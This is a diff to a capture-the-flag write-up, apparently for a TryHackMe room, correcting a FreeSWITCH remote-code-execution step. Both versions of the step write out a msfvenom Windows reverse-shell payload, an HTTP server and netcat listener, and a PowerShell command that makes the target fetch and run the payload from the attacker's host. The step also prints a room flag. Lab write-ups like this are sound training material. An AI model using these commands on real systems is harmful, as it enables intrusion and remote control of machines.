@@ -60,7 +60,7 @@ Content-Length: 25
 win-eom4pk0578n\nekrotic
 ```
 
-4. Create a payload with msfvenom `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip address> LPORT=4444 -f exe > payload1.exe`. Then create an http server to serve the payload `python3 -m http.server`. Set up a netcat listener with `nc -nvlp 4444`. Finally, download and invoke the payload on the target machine with `python3 freeswitch_rce.py <target ip address> "powershell.exe Invoke-WebRequest -Uri http://<attacker ip address>:8000 -OutFile ./payload1.exe && .\payload1.exe"`
+4. Create a payload with msfvenom `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip address> LPORT=4444 -f exe > payload1.exe`. Then create an http server to serve the payload `python3 -m http.server`. Set up a netcat listener with `nc -nvlp 4444`. Finally, download and invoke the payload on the target machine with `python3 freeswitch_rce.py <target ip address> "powershell.exe Invoke-WebRequest -Uri http://<attacker ip address>:8000/payload1.exe -OutFile ./payload1.exe && .\payload1.exe"`
 
 5. After getting the shell, look around and find both user.txt and root.txt in `C:\Users\Nekrotic\Desktop`. Using `more user.txt` gives us `THM{64bca0843d535fa73eecdc59d27cbe26}`. We can't view root.txt because we have insufficient permissions.
 
